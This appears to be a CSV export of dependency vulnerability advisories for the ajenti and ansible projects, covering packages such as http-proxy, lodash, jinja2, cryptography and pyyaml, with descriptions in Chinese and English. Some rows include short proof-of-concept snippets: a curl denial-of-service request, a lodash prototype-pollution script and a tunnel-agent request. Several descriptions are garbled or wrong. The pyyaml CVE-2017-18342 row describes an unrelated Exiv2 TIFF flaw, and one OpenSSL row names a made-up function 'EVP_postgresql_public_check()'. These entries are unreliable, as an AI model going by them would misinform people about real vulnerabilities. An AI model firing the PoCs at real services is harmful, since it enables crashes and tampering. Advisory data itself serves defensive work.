- [GitHub Commit](https://github.com/jonschlinkert/unset-value/pull/12/commits/abb534769f6ea62c3dd988f5ce0a4ebd1f91b561)
- [GitHub Issue](https://github.com/jonschlinkert/unset-value/issues/11)
- [GitHub PR](https://github.com/jonschlinkert/unset-value/pull/12)
- [GitHub Release](https://github.com/jonschlinkert/unset-value/releases)
",2,2
ajenti_ajenti,braces,2.3.2,False,CVE-2024-4068,CWE-1050 CWE-400,2024-05-13,NPM 包 braces 3.0.3 之前的版本未能限制它可以处理的字符数量，这可能导致内存耗尽。在 lib/parse.js 文件中，如果恶意用户输入“不平衡的大括号”，解析过程会进入循环，导致程序开始分配堆内存而不释放它。最终，JavaScript 堆限制被达到，程序将崩溃。,2,2
ajenti_ajenti,minimist,0.0.10,False,,,2020-03-14,"**Withdrawn**
GitHub has withdrawn this advisory in place of GHSA-vh95-rmgr-6w4m and GHSA-6chw-6frg-f759.
The reason for withdrawing is that some mistakes were made during the ingestion of CVE-2020-7598
which caused this advisory to be published with incorrect information.

In order to provide accurate advisory information, new advisories were created:

- minimist: https://github.com/advisories/GHSA-vh95-rmgr-6w4m
- acorn: https://github.com/advisories/GHSA-6chw-6frg-f759",3,-2
ajenti_ajenti,useragent,2.3.0,False,CVE-2020-26311,CWE-1333,2024-10-26,useragent 是由个人开发者 Arnout Kazemier 开发的一个高性能用户代理解析器，主要用于从用户代理字符串中提取设备和浏览器信息。该组件存在一个正则表达式拒绝服务（ReDoS）漏洞，漏洞的根源在于不当处理用户提供的特定构造的输入字符串，从而导致正则表达式在执行时耗费大量资源。,2,2
ajenti_ajenti,tmp,0.0.33,False,CVE-2025-54798,CWE-59,2025-08-07,tmp 是一个用于 Node.js 的临时文件和目录创建库。该漏洞存在于 tmp 组件 0.2.3 版本，主要由于 `_resolvePath` 函数未正确处理符号链接（symlink）路径解析，导致攻击者能够通过 `dir` 参数创建指向系统默认临时目录（tmpDir）外部的符号链接目录，从而绕过路径检查逻辑。具体来说，攻击者可以利用符号链接指向 tmpDir 外部的目录，触发 `_assertIsRelative` 检查失效，进而在未经授权的目录中创建临时文件或目录。该漏洞根本原因是组件缺乏对路径解析中符号链接的验证。,3,0
ajenti_ajenti,http-proxy,0.10.4,False,,CWE-184 CWE-693,2020-09-05,"Versions of `http-proxy` prior to 1.18.1 are vulnerable to Denial of Service. An HTTP request with a long body triggers an `ERR_HTTP_HEADERS_SENT` unhandled exception that crashes the proxy server. This is only possible when the proxy server sets headers in the proxy request using the `proxyReq.setHeader` function.   

For a proxy server running on `http://localhost:3000`, the following curl request triggers the unhandled exception:  
```curl -XPOST http://localhost:3000 -d ""$(python -c 'print(""x""*1025)')""```


## Recommendation

Upgrade to version 1.18.1 or later",2,2
ajenti_ajenti,http-proxy,0.10.4,False,,CWE-400,2020-05-17,"## Overview
[http-proxy](https://github.com/nodejitsu/node-http-proxy) is a library that HTTP proxying for the masses.

Affected versions of this package are vulnerable to Denial of Service (DoS). HTTP requests with long bodies can crash the proxy sever via triggering an `ERR_HTTP_HEADERS_SENT` unhandled exception. 

*Note*
This vulnerability is only viable if proxy server uses the `proxyReq.setHeader` function to set headers in the proxy request.

## PoC by Grant Murphy

A proxy server on `http://localhost:3000`, using the following curl request will trigger the unhandled exception:
```
curl -XPOST http://localhost:3000 -d ""$(python -c 'print(""x""*1025)')""
```

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `http-proxy` to version 1.18.1 or higher.
## References
- [GitHub Issue](https://github.com/http-party/node-http-proxy/issues/1328)
- [GitHub PR](https://github.com/http-party/node-http-proxy/pull/1447)
",3,0
ajenti_ajenti,async,0.2.10,False,CVE-2024-39249,CWE-1333,2024-07-01,"Async是英国Caolan McMahon个人开发者的一个实用模块。用于使用异步 JavaScript。
Async 2.6.4及之前版本和3.2.5及之前版本存在安全漏洞，该漏洞源于在解析自动注入函数中的函数时容易受到正则表达式拒绝服务（ReDoS）攻击。",3,2
ajenti_ajenti,lodash,3.10.1,False,,CWE-1321,2020-08-21,"## Overview
[lodash](https://www.npmjs.com/package/lodash) is a modern JavaScript utility library delivering modularity, performance, & extras.

Affected versions of this package are vulnerable to Prototype Pollution via the `setWith` and `set` functions.

## PoC by awarau
* Create a JS file with this contents:
```
lod = require('lodash')
lod.setWith({}, ""__proto__[test]"", ""123"")
lod.set({}, ""__proto__[test2]"", ""456"")
console.log(Object.prototype)
```
* Execute it with `node`
* Observe that `test` and `test2` is now in the `Object.prototype`.

## Details

Prototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.

There are two main ways in which the pollution of prototypes occurs:

-   Unsafe `Object` recursive merge
    
-   Property definition by path
    

### Unsafe Object recursive merge

The logic of a vulnerable recursive merge function follows the following high-level model:
```
merge (target, source)

  foreach property of source

    if property exists and is an object on both the target and the source

      merge(target[property], source[property])

    else

      target[property] = source[property]
```
<br>  

When the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.

Clone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.

`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.

### Property definition by path

There are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`

If the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object.

## Types of attacks

There are a few methods by which Prototype Pollution can be manipulated:

| Type |Origin  |Short description |
|--|--|--|
| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |
 |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|
|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|

## Affected environments

The following environments are susceptible to a Prototype Pollution attack:

-   Application server
    
-   Web server

-   Web browser
    

## How to prevent

1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.
    
2.  Require schema validation of JSON input.
    
3.  Avoid using unsafe recursive merge functions.
    
4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.
    
5.  As a best practice use `Map` instead of `Object`.

### For more information on this vulnerability type:

[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)

## Remediation
Upgrade `lodash` to version 4.17.17 or higher.
## References
- [HackerOne Report](https://hackerone.com/reports/864701)
",2,2
ajenti_ajenti,serve-static,1.10.3,False,CVE-2024-43800,CWE-79,2024-09-10,"Express.js是expressjs开源的一个 Node.js 的快速、无限制、极简的 web 框架。
Express.js存在跨站脚本漏洞，该漏洞源于将不受信任的用户输入传递给redirect()，可能会执行不受信任的代码。",4,0
ajenti_ajenti,send,0.13.2,False,CVE-2024-43799,CWE-79,2024-09-10,"send是pillarjs开源的一个用于将文件从文件系统流式传输为 http 响应的库。
send 0.19.0之前版本存在跨站脚本漏洞，该漏洞源于将不受信任的用户输入传递给SendStream.redirect()，从而执行不受信任的代码。",4,0
ajenti_ajenti,on-headers,1.0.2,False,CVE-2025-7339,CWE-241,2025-07-17,"on-headers是jshttp开源的一个应用软件。
on-headers 1.1.0版本存在安全漏洞，该漏洞源于传递数组到response.writeHead时可能无意修改响应头。",3,0
ajenti_ajenti,basic-auth-connect,1.0.0,False,CVE-2024-47178,CWE-208,2024-09-30,"basic-auth-connect是expressjs开源的一个用于节点和连接的基本身份验证中间件。
basic-auth-connect 1.1.0之前版本存在安全漏洞，该漏洞源于使用定时不安全的相等比较，从而会泄露定时信息。",2,2
ajenti_ajenti,ms,0.7.1,False,CVE-2017-20162,CWE-1333,2017-05-15,"vercel ms是微小的毫秒转换实用程序。
vercel ms 2.0.0之前版本存在安全漏洞，该漏洞源于文件index.js的函数解析存在问题，对参数str的操作会导致低效的正则表达式复杂性。",3,0
ajenti_ajenti,cookie,0.1.3,False,CVE-2024-47764,CWE-74,2024-10-04,"cookie是jshttp开源的一个 HTTP 服务器 cookie 解析和序列化库。
cookie 0.7.0之前版本存在安全漏洞，该漏洞源于允许攻击者通过操纵cookie名称来设置cookie的其他字段，导致意外的cookie值。",3,2
ajenti_ajenti,base64-url,1.2.1,False,,CWE-125,2019-06-01,"Versions of `base64-url` before 2.0.0 are vulnerable to out-of-bounds read as it allocates uninitialized Buffers when number is passed in input.


## Recommendation

Update to version 2.0.0 or later.",2,-2
ajenti_ajenti,qs,4.0.0,False,CVE-2022-24999,CWE-1321,2022-11-26,"ljharb qs是美国Jordan Harband个人开发者的一个具有嵌套支持的查询字符串解析器。
qs 6.10.3 之前版本存在安全漏洞，该漏洞源于parse忽略__proto__键，攻击者利用该漏洞可以将攻击载荷放在用于访问应用程序的 URL 的查询字符串中。",2,1
ajenti_ajenti,ms,0.7.2,False,CVE-2017-20162,CWE-1333,2017-05-15,"vercel ms是微小的毫秒转换实用程序。
vercel ms 2.0.0之前版本存在安全漏洞，该漏洞源于文件index.js的函数解析存在问题，对参数str的操作会导致低效的正则表达式复杂性。",3,0
ajenti_ajenti,body-parser,1.13.3,False,CVE-2024-45590,CWE-405,2024-09-10,"body-parser 是 expressjs 开源的一个 Node.js 解析中间件，它用于处理 JSON, Raw, Text 和 URL 编码的数据。body-parser 1.20.3 之前版本存在一个安全漏洞，这个漏洞的根本原因在于处理请求时的资源管理不当，导致系统无法及时响应，并可能因大量请求导致拒绝服务攻击。",2,1
ajenti_ajenti,phantomjs,1.9.20,False,CVE-2019-17221,CWE-552,2019-11-05,"PhantomJS是一款用于自动化网页交互的无头浏览器。
PhantomJS 2.1.1及之前版本中的网页模块的‘page.open()’函数存在安全漏洞。攻击者可借助特制的HTML文件利用该漏洞读取文件系统上任意文件。",2,1
ajenti_ajenti,form-data,1.0.1,False,CVE-2025-7783,CWE-330,2025-07-18,"form-data 是一个用于处理表单数据的库，常用于 Node.js 应用中处理多部分表单提交。该库在版本 < 2.5.4, 3.0.0 - 3.0.3, 4.0.0 - 4.0.3 中存在使用不足随机值的漏洞。具体来说，form-data 使用了 Math.random() 函数来生成多部分表单的边界字符串。由于 Math.random() 生成的值是伪随机且可预测的，攻击者可以通过观察应用中生成的随机值，预测边界字符串的生成，从而实现 HTTP 参数污染攻击。攻击者通过注入额外的参数影响服务器的参数解析和执行逻辑。此漏洞的根本原因是随机值生成器的随机性不足，允许攻击者预测 boundary 值并构造恶意请求。",1,1
ajenti_ajenti,async,2.6.4,False,CVE-2024-39249,CWE-1333,2024-07-01,"Async是英国Caolan McMahon个人开发者的一个实用模块。用于使用异步 JavaScript。
Async 2.6.4及之前版本和3.2.5及之前版本存在安全漏洞，该漏洞源于在解析自动注入函数中的函数时容易受到正则表达式拒绝服务（ReDoS）攻击。",3,2
ajenti_ajenti,tunnel-agent,0.4.3,False,,CWE-200,2019-06-04,"Versions of `tunnel-agent` before 0.6.0 are vulnerable to memory exposure.

This is exploitable if user supplied input is provided to the auth value and is a number.

Proof-of-concept:
```js
require('request')({
  method: 'GET',
  uri: 'http://www.example.com',
  tunnel: true,
  proxy:{
    protocol: 'http:',
    host:'127.0.0.1',
    port:8080,
    auth:USERSUPPLIEDINPUT // number
  }
});
```


## Recommendation

Update to version 0.6.0 or later.",3,-2
ajenti_ajenti,qs,5.2.1,False,CVE-2022-24999,CWE-1321,2022-11-26,"ljharb qs是美国Jordan Harband个人开发者的一个具有嵌套支持的查询字符串解析器。
qs 6.10.3 之前版本存在安全漏洞，该漏洞源于parse忽略__proto__键，攻击者利用该漏洞可以将攻击载荷放在用于访问应用程序的 URL 的查询字符串中。",2,1
ajenti_ajenti,hawk,3.1.3,False,CVE-2022-29167,CWE-400 CWE-1333,2022-05-05,"hawk是Mozilla基金会的一个 HTTP 密钥持有者身份验证方案。
hawk 9.0.1版本之前存在安全漏洞，该漏洞源于hawk使用正则表达式解析 HTTP 标头，攻击者利用该漏洞可导致正则表达式所引发的Dos攻击（ReDoS）。",2,0
ajenti_ajenti,concat-stream,1.5.0,False,,CWE-200,2019-06-04,"Versions of `concat-stream` before 1.5.2 are vulnerable to memory exposure if userp provided input is passed into `write()`

Versions <1.3.0 are not affected due to not using unguarded Buffer constructor.



## Recommendation

Update to version 1.5.2, 1.4.11, 1.3.2 or later.

If you are unable to update make sure user provided input into the `write()` function is not a number.",3,-2
ajenti_ajenti,diff,1.0.8,False,,CWE-400,2019-06-14,"A vulnerability was found in diff before v3.5.0, the affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks.",2,-2
ajenti_ajenti,minimist,0.0.8,False,,,2020-03-14,"**Withdrawn**
GitHub has withdrawn this advisory in place of GHSA-vh95-rmgr-6w4m and GHSA-6chw-6frg-f759.
The reason for withdrawing is that some mistakes were made during the ingestion of CVE-2020-7598
which caused this advisory to be published with incorrect information.

In order to provide accurate advisory information, new advisories were created:

- minimist: https://github.com/advisories/GHSA-vh95-rmgr-6w4m
- acorn: https://github.com/advisories/GHSA-6chw-6frg-f759",3,-2
ajenti_ajenti,ms,0.6.2,False,CVE-2017-20162,CWE-1333,2017-05-15,"vercel ms是微小的毫秒转换实用程序。
vercel ms 2.0.0之前版本存在安全漏洞，该漏洞源于文件index.js的函数解析存在问题，对参数str的操作会导致低效的正则表达式复杂性。",3,0
ajenti_ajenti,async,1.5.2,False,CVE-2024-39249,CWE-1333,2024-07-01,"Async是英国Caolan McMahon个人开发者的一个实用模块。用于使用异步 JavaScript。
Async 2.6.4及之前版本和3.2.5及之前版本存在安全漏洞，该漏洞源于在解析自动注入函数中的函数时容易受到正则表达式拒绝服务（ReDoS）攻击。",3,2
ansible_ansible,cryptography,,True,CVE-2023-0217,CWE-476,2023-02-07,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。在3.0.0到3.0.7版本的OpenSSL中，应用程序使用EVP_postgresql_public_check()函数检查格式错误的DSA公钥时，可能触发无效指针解引用漏洞，导致拒绝服务。,2,2
ansible_ansible,cryptography,,True,CVE-2016-9243,CWE-20,2016-11-01,"Cryptography是一个用于Python开发的加密工具包。HKDF是其中的一个基于HMAC的密钥导出函数。
Cryptography 1.5.2之前的版本中的HKDF存在安全漏洞。攻击者可利用该漏洞获取敏感信息的访问权限或绕过安全限制，执行未授权的操作。",2,2
ansible_ansible,cryptography,,True,CVE-2023-0401,CWE-476,2023-02-07,OpenSSL是一个开源的通用加密库，支持SSL和TLS协议。该漏洞出现在3.0.0到3.0.7版本，当验证PKCS7签名数据时，缺少对初始化函数返回值的检查，可能导致空指针解引用，从而引发程序崩溃。,2,2
ansible_ansible,cryptography,,True,CVE-2020-25659,CWE-385,2020-10-25,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography 存在安全漏洞，该漏洞源于定时oracle攻击进行RSA解密。",2,0
ansible_ansible,cryptography,,True,,CWE-415,2017-12-04,"## Overview
Affected versions of [`cryptography`](https://pypi.python.org/pypi/cryptography) are vulnerable to Denial of Service (DoS).

Double free vulnerability in the dsa_priv_decode function in crypto/dsa/dsa_ameth.c in OpenSSL 1.0.1 before 1.0.1s and 1.0.2 before 1.0.2g allows remote attackers to cause a denial of service (memory corruption) or possibly have unspecified other impact via a malformed DSA private key. (related to CVE-2016-0705)

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## Remediation
Upgrade `cryptography` to version 0.9.1 or higher.

## References
- [GitHub Changelog](https://github.com/pyca/cryptography/blob/master/CHANGELOG.rst#091---2015-06-06)
- [Github PR](https://github.com/pyca/cryptography/pull/2013)
- [Gtihub Commit](https://github.com/pyca/cryptography/commit/87c99a503a699f5c0296636237a9208fc161cc9e)
",2,2
ansible_ansible,cryptography,,True,,CWE-400,2017-12-04,"## Overview
Affected versions of [`cryptography`](https://pypi.python.org/pypi/cryptography) are vulnerable to Denial of Service (DoS).

The OpenSSL backend beffore 1.0.2 made use of assertions to check response where the tests could not trigger a failure. If a user ran Python with this -O flag and got an invalid response code this could lead to a crash.

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## Remediation
Upgrade `cryptography` to version 1.0.2 or higher.

## References
- [GitHub Changelog](https://github.com/pyca/cryptography/blob/master/CHANGELOG.rst#102---2015-09-27)
- [Redhat Bugzilla](https://bugzilla.redhat.com/show_bug.cgi?id=1267548)
",3,2
ansible_ansible,cryptography,,True,,CWE-222,2015-09-10,"## Overview
[`cryptography`](https://pypi.python.org/pypi/cryptography) provides cryptographic recipes and primitives to Python developers.

Affected versions of this package are vulnerable to TLS Truncation. A malicious user can prevent a user from fetching the parts of a message by inserting TCP code into a message indicating the message has completed.

## References
- [GitHub PR](https://github.com/pyca/cryptography/pull/2334)
- [GitHub Commit](https://github.com/pyca/cryptography/commit/41aabcbd2326ae154a16a1a050ee01fb9a54bd19)
",3,2
ansible_ansible,cryptography,,True,CVE-2023-2650,CWE-770,2023-05-30,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。该漏洞源于处理特制的ASN.1对象标识符时可能非常慢，导致系统拒绝服务。,3,0
ansible_ansible,cryptography,,True,CVE-2023-50782,CWE-208 CWE-203,2023-12-13,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography存在安全漏洞。攻击者利用该漏洞可以获取敏感信息。",2,2
ansible_ansible,cryptography,,True,CVE-2022-4203,CWE-125,2023-02-07,OpenSSL是一个开源的能够实现SSL和TLS协议的通用加密库，支持多种加密算法。该漏洞源于在X.509证书验证中，尤其是在名称约束检查阶段，可以触发读缓冲区溢出。,3,0
ansible_ansible,cryptography,,True,CVE-2023-0216,CWE-476,2023-02-07,OpenSSL是一个开源的能够实现安全套接层和安全传输层协议的通用加密库，支持多种加密算法。存在无效指针解引用漏洞。当应用程序尝试使用 d2i_PKCS7()、d2i_PKCS7_bio() 或 d2i_PKCS7_fp() 函数加载格式错误的 PKCS7 数据时，可能会导致程序崩溃。,2,2
ansible_ansible,cryptography,,True,CVE-2023-38325,CWE-295,2023-07-14,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography 41.0.2之前版本存在安全漏洞，该漏洞源于会错误地处理具有关键选项的 SSH 证书。",2,2
ansible_ansible,botocore,,True,,CWE-362,2023-08-01,"## Overview

Affected versions of this package are vulnerable to Race Condition related to assuming a role for the first time.
## Remediation
Upgrade `botocore` to version 1.9.12 or higher.
## References
- [GitHub Commit](https://github.com/boto/botocore/commit/5e044f7b94acb83fce4265b5ce47620db70a9876)
- [GitHub PR](https://github.com/boto/botocore/pull/1405)
",3,0
ansible_ansible,botocore,,True,,CWE-362,2023-08-01,"## Overview

Affected versions of this package are vulnerable to Race Condition related to assuming a role for the first time.
## Remediation
Upgrade `botocore` to version 1.9.12 or higher.
## References
- [GitHub Commit](https://github.com/boto/botocore/commit/5e044f7b94acb83fce4265b5ce47620db70a9876)
- [GitHub PR](https://github.com/boto/botocore/pull/1405)
",3,0
ansible_ansible,black,,True,CVE-2024-21503,CWE-1333 CWE-75,2024-03-18,"Black是一个 Python 代码格式化程序。
black 24.3.0 之前版本存在安全漏洞，该漏洞源于 strings.py 文件中的lines_with_leading_tabs_expanded 函数容易受到拒绝服务攻击，攻击者利用该漏洞可以通过制作恶意输入导致拒绝服务。",3,2
ansible_ansible,jinja2,,True,CVE-2014-0012,CWE-264,2014-01-18,"Jinja2是一款基于Python的模板引擎。该产品具有完整的Unicode支持，并提供了可选的沙箱模板执行环境。
Jinja2 2.7.2版本存在权限许可和访问控制问题漏洞，该漏洞源于程序没有正确创建临时目录。本地攻击者可通利用该漏洞以用户的UID提前创建临时目录，获取特权。",3,0
ansible_ansible,jinja2,,True,CVE-2020-28493,CWE-400,2021-02-01,"Jinja2是一款基于Python的模板引擎。该产品具有完整的Unicode支持，并提供了可选的沙箱模板执行环境。
jinja2 from 0.0.0 and before 2.11.3 存在资源管理错误漏洞，该漏洞源于regex的ReDOS漏洞。",3,2
ansible_ansible,jinja2,,True,CVE-2016-10745,CWE-134,2019-04-08,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Pallets Jinja中存在格式化字符串错误漏洞。该漏洞源于网络系统或产品接收外部格式化字符串作为参数时，对参数类型、数量等过滤不严格。以下产品及版本受到影响：Pallets Jinja 2.8.1之前版本。",2,2
ansible_ansible,jinja2,,True,CVE-2019-10906,CWE-693,2019-04-06,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Pallets Jinja 2.10.1之前版本中存在权限许可和访问控制问题漏洞。攻击者可利用该漏洞绕过沙盒保护。",2,2
ansible_ansible,jinja2,,True,CVE-2024-22195,CWE-79,2024-01-11,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Jinja 3.1.3之前版本存在安全漏洞，该漏洞源于存在跨站脚本（XSS）漏洞。",3,0
ansible_ansible,jinja2,,True,CVE-2014-1402,CWE-264,2014-01-10,"Jinja2是一个基于Python的模板引擎，它拥有完整的unicode支持，并且提供了可选的沙箱模板执行环境来保证安全。
Jinja2 2.7.1及之前版本的bccache.FileSystemBytecodeCache中的默认配置存在安全漏洞，该漏洞源于程序没有正确创建临时文件。本地攻击者可借助/tmp目录下特制的cache文件利用该漏洞获取特权。",2,0
ansible_ansible,jinja2,,True,CVE-2024-34064,CWE-79,2024-05-06,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Pallets Jinja 3.1.4之前版本存在安全漏洞，该漏洞源于将用户输入作为键传递给 xmlattr 过滤器时，Jinja 容易受到 HTML 属性注入。",3,0
ansible_ansible,jinja2,,True,CVE-2024-56326,CWE-693 CWE-1336,2024-12-23,Jinja 是由 Pallets 开源的一个快速、富有表现力并可扩展的模板引擎。该漏洞存在于 Jinja 版本 3.1.5 之前，由于在沙箱环境中对 str.format 调用的检测存在不当，攻击者可以控制模板的内容并执行任意 Python 代码。攻击者可以通过创建包含恶意字符串的模板并利用自定义过滤器实现攻击，这可能导致系统安全性严重受损。,3,0
ansible_ansible,jinja2,,True,CVE-2024-56201,CWE-150,2024-12-23,Jinja是Pallets开源的一个快速、富有表现力且可扩展的模板引擎。版本3.1.5之前的Jinja存在安全漏洞，该漏洞源于编译器的一个错误，允许同时控制模板内容和文件名的攻击者执行任意Python代码，无论Jinja的沙箱是否被使用。当应用程序执行不可信的模板时，攻击者需要能够控制模板的文件名和内容，才能有效利用此漏洞。,3,0
ansible_ansible,jinja2,,True,CVE-2025-27516,CWE-1336,2025-03-05,Jinja2 是一个广泛用于Web应用程序的模板引擎，用于渲染模板。该漏洞源于 Jinja2 沙盒环境与 `|attr` 过滤器交互时的一个疏忽。特别是，当攻击者能够控制模板的内容时，就可以利用此缺陷执行任意 Python 代码。这意味着，如果某个应用程序处理不可信的模板，就可能受到威胁，从而导致未经授权的系统访问或操作。,3,2
ansible_ansible,pyyaml,,True,CVE-2020-14343,CWE-20,2020-07-26,CVE-2020-14343是与Python的第三方库“PyYAML”相关的漏洞，该库用于处理YAML文件。该漏洞的根本原因在于PyYAML库的yaml.load函数会解析未经验证的输入数据。具体来说，当用户使用yaml.load函数并且未明确指定加载器时，PyYAML会默认使用“UnsafeLoader”来解析YAML文件，这会导致任意代码执行的风险。如果攻击者能够控制传递给yaml.load的YAML内容，他们就可以构造一个恶意的YAML文件，其中包含恶意的Python对象。yaml.load在加载这个文件时会执行这些对象的代码，从而导致任意代码执行。这使得攻击者可以在目标系统上执行任意命令，潜在地获得系统的控制权限。,1,0
ansible_ansible,pyyaml,,True,CVE-2017-18342,CWE-502,2018-06-27,CVE-2017-18342 是一个影响 Exiv2 库的整数溢出漏洞。Exiv2 是一个用于处理图像元数据的库，在处理 TIFF 图像文件时，由于对用户输入数据的边界检查不充分，可能导致整数溢出。具体来说，该漏洞出现在 readTiffDirectory 函数中，该函数在处理 TIFF 文件中的目录项时，没有正确检查涉及的偏移量和大小。这可能导致超出预期的内存分配，并进一步引发缓冲区溢出，允许攻击者通过构造恶意的 TIFF 文件来利用该漏洞，最终导致任意代码执行。,1,0
ansible_ansible,cryptography,#typestubsnotpublishedseparately,True,CVE-2023-0217,CWE-476,2023-02-07,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。在3.0.0到3.0.7版本的OpenSSL中，应用程序使用EVP_postgresql_public_check()函数检查格式错误的DSA公钥时，可能触发无效指针解引用漏洞，导致拒绝服务。,2,2
ansible_ansible,cryptography,#typestubsnotpublishedseparately,True,CVE-2016-9243,CWE-20,2016-11-01,"Cryptography是一个用于Python开发的加密工具包。HKDF是其中的一个基于HMAC的密钥导出函数。
Cryptography 1.5.2之前的版本中的HKDF存在安全漏洞。攻击者可利用该漏洞获取敏感信息的访问权限或绕过安全限制，执行未授权的操作。",2,2
ansible_ansible,cryptography,#typestubsnotpublishedseparately,True,CVE-2023-0401,CWE-476,2023-02-07,OpenSSL是一个开源的通用加密库，支持SSL和TLS协议。该漏洞出现在3.0.0到3.0.7版本，当验证PKCS7签名数据时，缺少对初始化函数返回值的检查，可能导致空指针解引用，从而引发程序崩溃。,2,2
ansible_ansible,cryptography,#typestubsnotpublishedseparately,True,CVE-2020-25659,CWE-385,2020-10-25,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography 存在安全漏洞，该漏洞源于定时oracle攻击进行RSA解密。",2,0
ansible_ansible,cryptography,#typestubsnotpublishedseparately,True,,CWE-415,2017-12-04,"## Overview
Affected versions of [`cryptography`](https://pypi.python.org/pypi/cryptography) are vulnerable to Denial of Service (DoS).

Double free vulnerability in the dsa_priv_decode function in crypto/dsa/dsa_ameth.c in OpenSSL 1.0.1 before 1.0.1s and 1.0.2 before 1.0.2g allows remote attackers to cause a denial of service (memory corruption) or possibly have unspecified other impact via a malformed DSA private key. (related to CVE-2016-0705)

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

